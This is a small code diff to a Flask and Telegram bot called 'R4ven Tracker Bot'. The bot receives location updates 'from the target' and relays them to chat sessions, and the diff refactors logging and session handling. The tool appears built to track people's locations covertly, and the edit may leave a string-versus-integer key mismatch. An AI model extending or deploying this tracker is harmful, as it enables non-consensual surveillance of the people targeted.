@@ -139,17 +139,10 @@ def get_website():
 @app.route("/location_update", methods=["POST"])
 def update_location():
     """Handles location updates from the target"""
-    data = request.json
+    data = request.json or {}
     chat_id = request.args.get('id', '')
     
-    # Convert chat_id to integer to match Telegram's chat_id type
-    try:
-        chat_id = str(chat_id)  # Ensure it's a string first
-    except ValueError:
-        logging.error(f"Invalid chat_id received: {chat_id}")
-        return "Error: Invalid chat ID"
-    
-    print(f"{G}[+] {C}UPDATE_LOCATIN_CALLED  {chat_id}  {W}")
+    print(f"{G}[+] {C}UPDATE_LOCATION_CALLED chat_id={chat_id} data={data}{W}")
 
     if chat_id in active_sessions:
         print(f"{G}[+] {C}Sending now...{W}")
@@ -254,9 +247,8 @@ def run_flask():
 def handle_start(message):
     """Handles the /start command"""
     # Clear any existing session for this user
-    chat_id = str(message.chat.id)
-    if chat_id in active_sessions:
-        del active_sessions[chat_id]
+    if message.chat.id in active_sessions:
+        del active_sessions[message.chat.id]
     
     welcome_msg = (
         f"🦅 *Welcome to R4ven Tracker Bot* 🦅\n\n"
